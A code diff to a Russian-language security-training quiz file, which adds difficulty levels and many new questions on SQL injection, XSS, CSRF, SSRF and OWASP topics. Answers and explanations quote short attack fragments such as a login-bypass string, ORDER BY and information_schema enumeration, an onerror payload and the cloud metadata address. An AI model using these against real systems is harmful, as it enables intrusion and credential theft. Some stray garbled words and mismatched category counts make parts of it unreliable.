@@ -977,6 +977,7 @@ app.post('/upload-pdf', async (req, res) => {
 export interface QuizQuestion {
   id: string;
   category: string;
+  difficulty: 'easy' | 'medium' | 'hard';
   question: string;
   options: string[];
   correctIndex: number;
@@ -988,6 +989,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'sql-1',
     category: 'SQL-инъекции',
+    difficulty: 'easy',
     question: 'Какой метод лучше всего защищает от SQL-инъекций?',
     options: [
       'Фильтрация спецсимволов на клиенте',
@@ -1002,6 +1004,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'sql-2',
     category: 'SQL-инъекции',
+    difficulty: 'easy',
     question: 'Что делает ввод "\\\' OR \\\'1\\\'=\\\'1" в форме логина?',
     options: [
       'Создаёт нового пользователя',
@@ -1016,6 +1019,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'sql-3',
     category: 'SQL-инъекции',
+    difficulty: 'easy',
     question: 'Для чего используется SQL-комментарий (-- ) при атаке?',
     options: [
       'Для ускорения выполнения запроса',
@@ -1030,6 +1034,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'sql-4',
     category: 'SQL-инъекции',
+    difficulty: 'medium',
     question: 'Какой оператор позволяет объединить результаты двух SELECT-запросов?',
     options: ['JOIN', 'UNION', 'MERGE', 'COMBINE'],
     correctIndex: 1,
@@ -1039,6 +1044,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'sql-5',
     category: 'SQL-инъекции',
+    difficulty: 'medium',
     question: 'Что такое «слепая» SQL-инъекция (Blind SQL Injection)?',
     options: [
       'Инъекция без использования SQL-комментариев',
@@ -1054,6 +1060,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'xss-1',
     category: 'XSS-атаки',
+    difficulty: 'easy',
     question: 'В чём главное отличие DOM-based XSS от отражённого?',
     options: [
       'DOM XSS работает только в Chrome',
@@ -1068,6 +1075,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'xss-2',
     category: 'XSS-атаки',
+    difficulty: 'easy',
     question: 'Какое свойство JavaScript безопаснее для вставки текста?',
     options: ['innerHTML', 'outerHTML', 'textContent', 'document.write'],
     correctIndex: 2,
@@ -1077,6 +1085,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'xss-3',
     category: 'XSS-атаки',
+    difficulty: 'easy',
     question: 'Что делает HTTP-заголовок Content Security Policy (CSP)?',
     options: [
       'Шифрует содержимое страницы',
@@ -1091,6 +1100,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'xss-4',
     category: 'XSS-атаки',
+    difficulty: 'medium',
     question: 'Какой тип XSS наиболее опасный?',
     options: ['Отражённый', 'DOM-based', 'Хранимый (Stored)', 'Все одинаково опасны'],
     correctIndex: 2,
@@ -1100,6 +1110,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'xss-5',
     category: 'XSS-атаки',
+    difficulty: 'medium',
     question: 'Какой атрибут HTML-тега чаще всего используется для XSS-атак?',
     options: ['style', 'class', 'onerror / onload / onclick', 'href'],
     correctIndex: 2,
@@ -1110,6 +1121,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'csrf-1',
     category: 'CSRF',
+    difficulty: 'easy',
     question: 'Что такое CSRF-атака?',
     options: [
       'Кража паролей через поддельный сайт',
@@ -1124,6 +1136,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'csrf-2',
     category: 'CSRF',
+    difficulty: 'easy',
     question: 'Какой механизм наиболее эффективен для защиты от CSRF?',
     options: [
       'Использование HTTPS',
@@ -1138,6 +1151,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'csrf-3',
     category: 'CSRF',
+    difficulty: 'easy',
     question: 'Какое значение cookie-атрибута SameSite обеспечивает лучшую защиту?',
     options: ['None', 'Lax', 'Strict', 'Off'],
     correctIndex: 2,
@@ -1147,6 +1161,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'csrf-4',
     category: 'CSRF',
+    difficulty: 'medium',
     question: 'Почему браузер автоматически отправляет куки при CSRF-атаке?',
     options: [
       'Из-за бага в браузере',
@@ -1161,6 +1176,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'csrf-5',
     category: 'CSRF',
+    difficulty: 'medium',
     question: 'Почему AJAX-запросы с CORS не защищают от CSRF по умолчанию?',
     options: [
       'CORS блокирует все кросс-доменные запросы',
@@ -1176,6 +1192,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'auth-1',
     category: 'Аутентификация',
+    difficulty: 'easy',
     question: 'Какой алгоритм рекомендуется для хеширования паролей?',
     options: ['MD5', 'SHA-256', 'bcrypt', 'Base64'],
     correctIndex: 2,
@@ -1185,6 +1202,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'auth-2',
     category: 'Аутентификация',
+    difficulty: 'easy',
     question: 'Что такое «соль» (salt) при хешировании паролей?',
     options: [
       'Зашифрованный пароль',
@@ -1199,6 +1217,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'auth-3',
     category: 'Аутентификация',
+    difficulty: 'medium',
     question: 'Какой принцип безопасности нарушается, если сервер возвращает разные сообщения для «пользователь не найден» и «неправильный пароль»?',
     options: [
       'Принцип наименьших привилегий',
@@ -1213,6 +1232,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'auth-4',
     category: 'Аутентификация',
+    difficulty: 'medium',
     question: 'Что такое JWT (JSON Web Token)?',
     options: [
       'Способ шифрования данных',
@@ -1227,6 +1247,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'auth-5',
     category: 'Аутентификация',
+    difficulty: 'hard',
     question: 'Сколько символов должен содержать надёжный пароль?',
     options: [
       'Минимум 6 символов',
@@ -1242,6 +1263,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'general-1',
     category: 'Общая безопасность',
+    difficulty: 'easy',
     question: 'Что такое OWASP?',
     options: [
       'Программный продукт для защиты серверов',
@@ -1256,6 +1278,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'general-2',
     category: 'Общая безопасность',
+    difficulty: 'easy',
     question: 'Что такое Principle of Least Privilege (Принцип наименьших привилегий)?',
     options: [
       'Каждый пользователь должен иметь права администратора',
@@ -1270,6 +1293,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'general-3',
     category: 'Общая безопасность',
+    difficulty: 'easy',
     question: 'Что такое HTTP-заголовок X-Frame-Options?',
     options: [
       'Определяет размер кадра изображения',
@@ -1284,6 +1308,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'general-4',
     category: 'Общая безопасность',
+    difficulty: 'easy',
     question: 'Что такое SSRF (Server-Side Request Forgery)?',
     options: [
       'Кража данных с сервера через forged request',
@@ -1298,6 +1323,7 @@ export const quizQuestions: QuizQuestion[] = [
   {
     id: 'general-5',
     category: 'Общая безопасность',
+    difficulty: 'easy',
     question: 'Что означает акроним HTTPS?',
     options: [
       'HyperText Transfer Protocol Secure',
@@ -1309,14 +1335,550 @@ export const quizQuestions: QuizQuestion[] = [
     explanation:
       'HTTPS (HyperText Transfer Protocol Secure) — это расширение протокола HTTP, использующее шифрование TLS/SSL для защиты передаваемых данных. Это обеспечивает конфиденциальность (данные нельзя прочитать), целостность (данные нельзя изменить) и аутентификацию (сервер — это тот, за кого он себя выдаёт).',
   },
+  // --- Additional General Security Questions ---
+  {
+    id: 'general-6',
+    category: 'Общая безопасность',
+    difficulty: 'medium',
+    question: 'Что такое «Defense in Depth» (Глубокая защита)?',
+    options: [
+      'Использование одного мощного средства защиты',
+      'Многослойная стратегия безопасности с несколькими уровнями защиты',
+      'Шифрование данных на нескольких уровнях OSI',
+      'Многофакторная аутентификация',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Defense in Depth — это стратегия, при которой используются несколько уровней защиты (фаерволы, IDS/IPS, шифрование, контроль доступа, мониторинг). Если один уровень будет преодолён, остальные продолжат защищать систему.',
+  },
+  {
+    id: 'general-7',
+    category: 'Общая безопасность',
+    difficulty: 'medium',
+    question: 'Какой HTTP-заголовок запрещает браузеру отображать страницу в iframe?',
+    options: [
+      'X-Content-Type-Options',
+      'X-Frame-Options: DENY',
+      'Strict-Transport-Security',
+      'X-XSS-Protection',
+    ],
+    correctIndex: 1,
+    explanation:
+      'X-Frame-Options: DENY полностью запрещает браузеру отображать страницу в iframe, frame или object. Это предотвращает кликджекинг-атаки. Альтернатива — CSP-директива frame-ancestors.',
+  },
+  {
+    id: 'general-8',
+    category: 'Общая безопасность',
+    difficulty: 'medium',
+    question: 'Что такое «Zero Day» (0-day) уязвимость?',
+    options: [
+      'Уязвимость, которая была обнаружена и исправлена',
+      'Уязвимость, о которой разработчики ещё не знают и для которой нет патча',
+      'Уязвимость, существующая менее одного дня',
+      'Уязвимость только в мобильных приложениях',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Zero Day — уязвимость, о которой разработчик ещё не знает (или не выпустил патч). Злоумышленники могут эксплуатировать её до того, как будет выпущено исправление. Название происходит от количества дней, прошедших с момента обнаружения.',
+  },
+  {
+    id: 'general-9',
+    category: 'Общая безопасность',
+    difficulty: 'medium',
+    question: 'Что делает HTTP-заголовок Strict-Transport-Security (HSTS)?',
+    options: [
+      'Запрещает загрузку скриптов с других доменов',
+      'Заставляет браузер использовать только HTTPS для данного домена',
+      'Отключает кэширование страницы',
+      'Включает двухфакторную аутентификацию',
+    ],
+    correctIndex: 1,
+    explanation:
+      'HSTS (HTTP Strict Transport Security) указывает браузеру всегда использовать HTTPS для данного домена, даже если пользователь вводит http://. Это предотвращает downgrade-атаки и перехват сессии через незашифрованное соединение.',
+  },
+  {
+    id: 'general-10',
+    category: 'Общая безопасность',
+    difficulty: 'medium',
+    question: 'Что такое «Security by Design»?',
+    options: [
+      'Добавление безопасности после разработки',
+      'Интеграция вопросов безопасности на каждом этапе разработки (SDLC)',
+      'Использование только платных инструментов защиты',
+      'Тестирование безопасности перед релизом',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Security by Design — подход, при котором безопасность встроена в процесс разработки с самого начала (требования, проектирование, кодирование, тестирование, деплой). Это дешевле и эффективнее, чем добавление безопасности после завершения разработки.',
+  },
+  // --- Additional SQL Injection Questions ---
+  {
+    id: 'sql-6',
+    category: 'SQL-инъекции',
+    difficulty: 'medium',
+    question: 'Что такое «Second-order SQL Injection»?',
+    options: [
+      'Инъекция, выполняемая через второй запрос',
+      'Инъекция, при которой payload сохраняется в БД и активируется при последующем использовании данных',
+      'Две инъекции одновременно',
+      'Инъекция через ORDER BY',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Second-order SQLi происходит в два этапа: вредоносный payload сохраняется в БД через看似 безобидный ввод (например, регистрация), а затем активируется при использовании этих данных в другом запросе. Многие разработчики санитизируют ввод, но забывают о выходе данных.',
+  },
+  {
+    id: 'sql-7',
+    category: 'SQL-инъекции',
+    difficulty: 'hard',
+    question: 'Какой запрос показывает количество столбцов в таблице при UNION-атаке?',
+    options: [
+      'SELECT COUNT(*) FROM table',
+      'ORDER BY 1, ORDER BY 2, ... до ошибки',
+      'DESCRIBE table',
+      'SHOW COLUMNS FROM table',
+    ],
+    correctIndex: 1,
+    explanation:
+      'ORDER BY N — стандартный метод определения числа столбцов. Злоумышленник увеличивает N (ORDER BY 1, ORDER BY 2, ...) до тех пор, пока не появится ошибка «Unknown column». Предыдущее значение N равно количеству столбцов, что необходимо для UNION SELECT.',
+  },
+  {
+    id: 'sql-8',
+    category: 'SQL-инъекции',
+    difficulty: 'hard',
+    question: 'Что делает функция GROUP_CONCAT() в MySQL при SQL-инъекции?',
+    options: [
+      'Группирует данные по категориям',
+      'Объединяет значения нескольких строк в одну строку',
+      'Удаляет дубликаты из результатов',
+      'Создаёт резервную копию таблицы',
+    ],
+    correctIndex: 1,
+    explanation:
+      'GROUP_CONCAT() объединяет значения из нескольких строк в одну строку через разделитель. При SQL-инjection это позволяет извлечь все имена таблиц или все пароли в одном результате, что удобно для exfiltration данных.',
+  },
+  {
+    id: 'sql-9',
+    category: 'SQL-инъекции',
+    difficulty: 'hard',
+    question: 'Какая таблица information_schema содержит список всех таблиц в MySQL?',
+    options: [
+      'information_schema.columns',
+      'information_schema.tables',
+      'information_schema.databases',
+      'information_schema.schema',
+    ],
+    correctIndex: 1,
+    explanation:
+      'information_schema.tables — мета-таблица MySQL, содержащая информацию обо всех табрах во всех базах данных. Злоумышленник может использовать SELECT table_name FROM information_schema.tables для получения списка таблиц.',
+  },
+  {
+    id: 'sql-10',
+    category: 'SQL-инъекции',
+    difficulty: 'hard',
+    question: 'Какой метод защиты от SQL-инъекций НЕ является достаточным?',
+    options: [
+      'Параметризованные запросы (prepared statements)',
+      'Хранимые процедуры (stored procedures)',
+      'Экранирование кавычек ( addslashes / mysqli_real_escape_string )',
+      'ORM с параметризированными запросами',
+    ],
+    correctIndex: 2,
+    explanation:
+      'Экранирование кавычек недостаточно, так как SQL-инъекции возможны без кавычек (числовые поля, ORDER BY, LIMIT и т.д.). Кроме того, экранирование зависит от кодировки и может быть обойдено. Параметризованные запросы — надёжный метод защиты.',
+  },
+  // --- Additional XSS Questions ---
+  {
+    id: 'xss-6',
+    category: 'XSS-атаки',
+    difficulty: 'hard',
+    question: 'Какой HTTP-заголовок CSP блокирует inline-скрипты?',
+    options: [
+      'Content-Security-Policy: default-src \'self\'',
+      'Content-Security-Policy: script-src \'self\'',
+      'Content-Security-Policy: style-src \'self\'',
+      'Content-Security-Policy: img-src \'self\'',
+    ],
+    correctIndex: 1,
+    explanation:
+      'script-src \'self\' разрешает загрузку скриптов только с текущего домена и блокирует inline-скрипты (теги <script> и обработчики событий в HTML). Для разрешения inline-скриптов нужен nonce или hash.',
+  },
+  {
+    id: 'xss-7',
+    category: 'XSS-атаки',
+    difficulty: 'hard',
+    question: 'Что такое «Mutation XSS» (mXSS)?',
+    options: [
+      'XSS через мутацию DOM-дерева браузером',
+      'XSS, который возникает, когда санитизированный HTML изменяется браузером и становится опасным',
+      'XSS через CSS-анимации',
+      'XSS в мобильном приложении',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Mutation XSS возникает, когда браузер модифицирует HTML после санитизации (например, закрывает незакрытые теги), и результирующий DOM содержит вредоносный код, которого не было в оригинальном санитизированном HTML.',
+  },
+  {
+    id: 'xss-8',
+    category: 'XSS-атаки',
+    difficulty: 'hard',
+    question: 'Какой тег HTML может выполнять JavaScript без onclick/onerror?',
+    options: [
+      '<div>',
+      '<span>',
+      '<svg><script>...</script></svg> или <img src=x onerror=...>',
+      '<p>',
+    ],
+    correctIndex: 2,
+    explanation:
+      'SVG поддерживает тег <script>, который выполняется при рендеринге изображения. Также <img src=x onerror=...> и <body onload=...> выполняют JavaScript. <iframe srcdoc=...> тоже может содержать скрипты.',
+  },
+  // --- Additional CSRF Questions ---
+  {
+    id: 'csrf-6',
+    category: 'CSRF',
+    difficulty: 'hard',
+    question: 'Что такое «Double Submit Cookie» — паттерн защиты от CSRF?',
+    options: [
+      'Отправка куки дважды для подтверждения',
+      'CSRF-токен отправляется и в куки, и в теле запроса; сервер сравнивает их',
+      'Использование двух разных CSRF-токенов',
+      'Двойная проверка пароля при отправке формы',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Double Submit Cookie: сервер устанавливает CSRF-токен в куки (JavaScript может его прочитать), и клиент должен отправить этот же токен в заголовке/теле запроса. Поскольку Same-Origin Policy блокирует чтение кук из другого домена, злоумышленник не может узнать значение токена.',
+  },
+  {
+    id: 'csrf-7',
+    category: 'CSRF',
+    difficulty: 'hard',
+    question: 'Почему GET-запросы особенно уязвимы к CSRF?',
+    options: [
+      'GET-запросы не используют куки',
+      'GET-запросы можно инициировать простым <img src="..."> или ссылкой без JavaScript',
+      'GET-запросы всегда безопасны',
+      'GET-запросы не поддерживают CSRF-токены',
+    ],
+    correctIndex: 1,
+    explanation:
+      'GET-запросы можно инициировать без JavaScript: через <img src="http://victim.com/action">, <link>, <script src> или простую ссылку. Это делает GET-запросы особенно уязвимыми. Поэтому важные действия (удаление, перевод денег) должны использовать POST/PUT/DELETE.',
+  },
+  {
+    id: 'csrf-8',
+    category: 'CSRF',
+    difficulty: 'hard',
+    question: 'Какой атрибут куки SameSite является наиболее строгим?',
+    options: [
+      'SameSite=None',
+      'SameSite=Lax',
+      'SameSite=Strict',
+      'SameSite=Block',
+    ],
+    correctIndex: 2,
+    explanation:
+      'SameSite=Strict запрещает отправку куки с ЛЮБЫМИ кросс-сайтовыми запросами (даже при переходе по ссылке). SameSite=Lax разрешает куки для безопасных GET-навигаций (переход по ссылке). SameSite=None разрешает все, но требует Secure (HTTPS).',
+  },
+  // --- Additional OWASP A01 (Broken Access Control) Questions ---
+  {
+    id: 'a01-1',
+    category: 'OWASP Top 10',
+    difficulty: 'easy',
+    question: 'Что такое IDOR (Insecure Direct Object Reference)?',
+    options: [
+      'Некорректная настройка DNS-записей',
+      'Когда пользователь может получить доступ к чужим данным, изменив ID в URL',
+      'Отсутствие шифрования на клиенте',
+      'Уязвимость в заголовках HTTP',
+    ],
+    correctIndex: 1,
+    explanation:
+      'IDOR — это уязвимость контроля доступа, при которой злоумышленник изменяет идентификатор объекта в URL или параметрах запроса (например, /api/users/100 вместо /api/users/50) и получает доступ к данным другого пользователя. Сервер не проверяет, имеет ли текущий пользователь права на этот объект.',
+  },
+  {
+    id: 'a01-2',
+    category: 'OWASP Top 10',
+    difficulty: 'easy',
+    question: 'Какой принцип контроля доступа является наилучшим по умолчанию?',
+    options: [
+      'Разрешить все, кроме запрещённых',
+      'Запретить всё, явно разрешить необходимое (deny by default)',
+      'Разрешить только GET-запросы',
+      'Разрешить аутентифицированным пользователям всё',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Принцип deny by default означает, что доступ запрещён по умолчанию, и только явно разрешённые действия доступны. Это предотвращает ситуации, когда новые эндпоинты или функции оказываются без контроля доступа.',
+  },
+  // --- Additional OWASP A04 (Insecure Design) Questions ---
+  {
+    id: 'a04-1',
+    category: 'OWASP Top 10',
+    difficulty: 'medium',
+    question: 'Чем «небезопасный дизайн» (Insecure Design) отличается от бага реализации?',
+    options: [
+      'Ничем, это одно и то же',
+      'Баг реализации — ошибка в коде; небезопасный дизайн — фундаментальный недостаток архитектуры',
+      'Небезопасный дизайн — только в мобильных приложениях',
+      'Баг реализации легче исправить',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Insecure Design — это недостатки, заложенные на этапе проектирования: отсутствие rate limiting, слабые бизнес-правила, отсутствие учёта злоупотреблений. Их нельзя исправить простой правкой кода — требуется изменение архитектуры. Implementation bugs — ошибки в коде (SQLi, XSS), исправляемые изменением реализации.',
+  },
+  {
+    id: 'a04-2',
+    category: 'OWASP Top 10',
+    difficulty: 'medium',
+    question: 'Что такое «Threat Modeling» (моделирование угроз)?',
+    options: [
+      'Тестирование безопасности после релиза',
+      'Систематическая идентификация потенциальных угроз на этапе проектирования',
+      'Настройка фаервола',
+      'Обучение пользователей безопасности',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Threat Modeling — процесс идентификации, оценки и смягчения угроз безопасности на этапе проектирования системы. Используются методологии STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege), DREAD и PASTA.',
+  },
+  // --- Additional OWASP A05 (Security Misconfiguration) Questions ---
+  {
+    id: 'a05-1',
+    category: 'OWASP Top 10',
+    difficulty: 'medium',
+    question: 'Какой HTTP-заголовок предотвращает MIME-type sniffing?',
+    options: [
+      'X-Frame-Options',
+      'X-Content-Type-Options: nosniff',
+      'Content-Security-Policy',
+      'X-XSS-Protection',
+    ],
+    correctIndex: 1,
+    explanation:
+      'X-Content-Type-Options: nosniff запрещает браузеру определять MIME-тип файла по содержимому (sniffing). Без этого заголовка браузер может интерпретировать .jpg-файл как JavaScript, что создаёт XSS-уязвимость.',
+  },
+  {
+    id: 'a05-2',
+    category: 'OWASP Top 10',
+    difficulty: 'medium',
+    question: 'Какой заголовок Helmet.js добавляет защиту от clickjacking?',
+    options: [
+      'helmet.xssFilter()',
+      'helmet.frameguard()',
+      'helmet.hsts()',
+      'helmet.dnsPrefetchControl()',
+    ],
+    correctIndex: 1,
+    explanation:
+      'helmet.frameguard() добавляет заголовок X-Frame-Options: SAMEORIGIN, который запрещает встраивание страницы в iframe с других доменов. Это предотвращает clickjacking — атаку, при которой невидимый iframe с целевым сайтом накладывается на видимую страницу.',
+  },
+  // --- Additional OWASP A06 (Vulnerable Components) Questions ---
+  {
+    id: 'a06-1',
+    category: 'OWASP Top 10',
+    difficulty: 'medium',
+    question: 'Что такое «транзитивная зависимость» (transitive dependency)?',
+    options: [
+      'Зависимость, указанная напрямую в package.json',
+      'Зависимость вашей зависимости — вы не указывали её напрямую, но она установлена',
+      'Зависимость, которая обновляется автоматически',
+      'Зависимость, которая работает только в production',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Транзитивная зависимость — это зависимость вашей зависимости. Например, вы используете пакет A, который зависит от пакета B. Вы не указывали B напрямую, но он установлен. Уязвимость в B может затронуть вас, даже если вы не знаете о его существовании.',
+  },
+  // --- Additional OWASP A08 (Integrity Failures) Questions ---
+  {
+    id: 'a08-1',
+    category: 'OWASP Top 10',
+    difficulty: 'hard',
+    question: 'Что такое «Subresource Integrity» (SRI) и зачем он нужен?',
+    options: [
+      'Механизм проверки целостности загружаемых внешних ресурсов (CDN-скрипты, стили)',
+      'Проверка SSL-сертификатов',
+      'Валидация JSON-ответов API',
+      'Проверка целостности cookies',
+    ],
+    correctIndex: 0,
+    explanation:
+      'SRI позволяет браузеру проверить целостность загружаемых ресурсов (скрипты, стили) с CDN по хешу. Атрибут integrity="sha384-..." в теге <script> гарантирует, что файл не был модифицирован. Если хеш не совпадает, браузер не выполнит скрипт.',
+  },
+  // --- Additional OWASP A09 (Logging) Questions ---
+  {
+    id: 'a09-1',
+    category: 'OWASP Top 10',
+    difficulty: 'hard',
+    question: 'Что НИКОГДА нельзя логировать в системе аутентификации?',
+    options: [
+      'IP-адреса пользователей',
+      'Временные метки входа',
+      'Пароли и токены аутентификации',
+      'User-Agent браузера',
+    ],
+    correctIndex: 2,
+    explanation:
+      'Пароли, токены, сессионные куки и другие секреты никогда не должны попадать в логи. Если логи будут скомпрометированы (а это случается), злоумышленник получит все учётные данные. Логируйте IP, timestamp, ID пользователя, но никогда секреты.',
+  },
+  {
+    id: 'a09-2',
+    category: 'OWASP Top 10',
+    difficulty: 'hard',
+    question: 'Что такое SIEM (Security Information and Event Management)?',
+    options: [
+      'Система управления паролями',
+      'Платформа для сбора, анализа и мониторинга логов безопасности в реальном времени',
+      'Тип фаервола',
+      'Инструмент для пентеста',
+    ],
+    correctIndex: 1,
+    explanation:
+      'SIEM — это платформа, которая собирает логи из различных источников (серверы, приложения, сетевые устройства), коррелирует события и генерирует алерты при подозрительной активности. Примеры: Splunk, ELK Stack, IBM QRadar.',
+  },
+  // --- Additional OWASP A10 (SSRF) Questions ---
+  {
+    id: 'a10-1',
+    category: 'OWASP Top 10',
+    difficulty: 'hard',
+    question: 'Какой IP-адрес используется для получения метаданных AWS EC2-инстанса?',
+    options: [
+      '192.168.0.1',
+      '10.0.0.1',
+      '169.254.169.254',
+      '127.0.0.1',
+    ],
+    correctIndex: 2,
+    explanation:
+      '169.254.169.254 — это link-local адрес, используемый AWS EC2 для предоставления метаданных инстанса. Через него можно получить IAM-учётные данные, конфигурацию и пользовательские данные. SSRF-атака, направленная на этот адрес, может привести к полной компрометации инстанса.',
+  },
+  {
+    id: 'a10-2',
+    category: 'OWASP Top 10',
+    difficulty: 'hard',
+    question: 'Что такое «DNS Rebinding» в контексте SSRF?',
+    options: [
+      'Атака, при которой доменное имя сначала указывает на внешний IP, а затем на внутренний',
+      'Шифрование DNS-запросов',
+      'Переименование DNS-сервера',
+      'Кэширование DNS-ответов',
+    ],
+    correctIndex: 0,
+    explanation:
+      'DNS Rebinding — атака на SSRF-защиту. Злоумышленник регистрирует домен, который сначала разрешается во внешний IP (проходит валидацию), а затем — в приватный IP (127.0.0.1 или 10.0.0.1). Когда сервер делает запрос к этому домену, DNS-ответ указывает на внутренний ресурс.',
+  },
+  // --- Additional Secure Coding Questions ---
+  {
+    id: 'coding-1',
+    category: 'Безопасное кодирование',
+    difficulty: 'easy',
+    question: 'Какую библиотеку лучше всего использовать для санитизации HTML в JavaScript?',
+    options: ['jQuery.sanitize()', 'DOMPurify', 'String.trim()', 'JSON.parse()'],
+    correctIndex: 1,
+    explanation:
+      'DOMPurify — проверенная библиотека для санитизации HTML. Она удаляет опасные теги и атрибуты (<script>, onerror, onload и т.д.), сохраняя безопасные элементы (p, b, em, a). Это надёжнее, чем ручная санитизация или использование встроенных методов браузера.',
+  },
+  {
+    id: 'coding-2',
+    category: 'Безопасное кодирование',
+    difficulty: 'medium',
+    question: 'Какой подход к валидации входных данных является наилучшим?',
+    options: [
+      'Валидация только на клиенте',
+      'Белый список (разрешить только ожидаемый формат)',
+      'Чёрный список (запретить известные опасные символы)',
+      'Валидация только на сервере без учёта клиентской',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Белый список (allowlist) — разрешать только то, что явно ожидается. Чёрные списки (blocklist) всегда неполны и могут быть обойдены. Валидация должна быть и на клиенте (UX), и на сервере (безопасность). Белый список для email, телефона, имени — гораздо надёжнее чёрного.',
+  },
+  {
+    id: 'coding-3',
+    category: 'Безопасное кодирование',
+    difficulty: 'hard',
+    question: 'Что такое «Timing Attack» и как защититься?',
+    options: [
+      'Атака на скорость сети; защита — CDN',
+      'Анализ времени выполнения для определения секретов; защита — сравнение за константное время',
+      'Атака через таймер браузера; защита — отключить setTimeout',
+      'DDoS через таймауты; защита — rate limiting',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Timing Attack использует разницу во времени выполнения для извлечения секретов. Например, посимвольное сравнение строк останавливается при первом несовпадении — по времени ответа можно определить количество совпавших символов. Защита: crypto.timingSafeEqual() в Node.js или bcrypt.compare().',
+  },
+  // --- Additional General Security Questions ---
+  {
+    id: 'general-11',
+    category: 'Общая безопасность',
+    difficulty: 'hard',
+    question: 'Что такое «Supply Chain Attack» (атака на цепочку поставок)?',
+    options: [
+      'Атака на логистическую компанию',
+      'Компрометация через зависимость, библиотеку или инструмент, используемый в разработке',
+      'Фишинговая атака на поставщиков',
+      'DDoS на CDN-провайдера',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Supply Chain Attack — атака через компрометацию компонентов разработки: библиотек (npm, PyPI), CI/CD-систем, инструментов сборки. Пример: атака на SolarWinds (2020), внедрение вредоносного кода в обновления пакета event-stream (2018). Защита: аудит зависимостей, lock-файлы, проверка пакетов.',
+  },
+  {
+    id: 'general-12',
+    category: 'Общая безопасность',
+    difficulty: 'hard',
+    question: 'Что такое «Bug Bounty Program»?',
+    options: [
+      'Программа лояльности для разработчиков',
+      'Программа вознаграждения за найденные уязвимости',
+      'Бесплатный хостинг для security-инструментов',
+      'Сертификация по безопасности',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Bug Bounty — программа, в которой организация выплачивает вознаграждение исследователям безопасности за обнаружение и ответственный disclosure уязвимостей. Примеры: HackerOne, Bugcrowd, Google VRP. Это позволяет привлекать сообщество к улучшению безопасности.',
+  },
+  {
+    id: 'general-13',
+    category: 'Общая безопасность',
+    difficulty: 'hard',
+    question: 'Что означает «Responsible Disclosure» (ответственное раскрытие)?',
+    options: [
+      'Публикация уязвимости в социальных сетях',
+      'Сообщение разработчику до публичного раскрытия, чтобы дать время на исправление',
+      'Продажа уязвимости на чёрном рынке',
+      'Игнорирование уязвимости',
+    ],
+    correctIndex: 1,
+    explanation:
+      'Responsible Disclosure — практика, при которой исследователь сообщает об уязвимости разработчику и даёт разумное время (обычно 90 дней) на исправление до публичного раскрытия. Это защищает пользователей, не подвергая их риску до выпуска патча.',
+  },
+  {
+    id: 'general-14',
+    category: 'Общая безопасность',
+    difficulty: 'hard',
+    question: 'Что такое «MITM-атака» (Man-in-the-Middle)?',
+    options: [
+      'Атака с использованием нескольких серверов',
+      'Перехват и возможная модификация связи между двумя сторонами без их знания',
+      'Атака на микросервисную архитектуру',
+      'Атака через промежуточное ПО',
+    ],
+    correctIndex: 1,
+    explanation:
+      'MITM-атака — злоумышленник располагается между двумя сторонами (клиентом и сервером), перехватывая и потенциально модифицируя передаваемые данные. Защита: HTTPS/TLS, проверка сертификатов, Certificate Pinning, HSTS.',
+  },
+  // --- Quiz category count update needed: SQL + XSS + CSRF + Auth + General + OWASP Top 10 + Secure Coding = 7 ---
 ];
 
 export const quizCategories = [
-  { id: 'sql', name: 'SQL-инъекции', icon: 'Database', count: 5 },
-  { id: 'xss', name: 'XSS-атаки', icon: 'FileText', count: 5 },
-  { id: 'csrf', name: 'CSRF', icon: 'Link', count: 5 },
-  { id: 'auth', name: 'Аутентификация', icon: 'Lock', count: 5 },
-  { id: 'general', name: 'Общая безопасность', icon: 'Shield', count: 5 },
+  { id: 'sql', name: 'SQL-инъекции', icon: 'Database', count: 10 },
+  { id: 'xss', name: 'XSS-атаки', icon: 'FileText', count: 8 },
+  { id: 'csrf', name: 'CSRF', icon: 'Link', count: 8 },
+  { id: 'auth', name: 'Аутентификация', icon: 'Lock', count: 8 },
+  { id: 'general', name: 'Общая безопасность', icon: 'Shield', count: 14 },
+  { id: 'owasp', name: 'OWASP Top 10', icon: 'Shield', count: 11 },
+  { id: 'coding', name: 'Безопасное кодирование', icon: 'Code', count: 3 },
 ];
 
 // ============================================================
@@ -1326,7 +1888,7 @@ export const modules = [
   {
     id: 'owasp',
     title: 'OWASP Top 10',
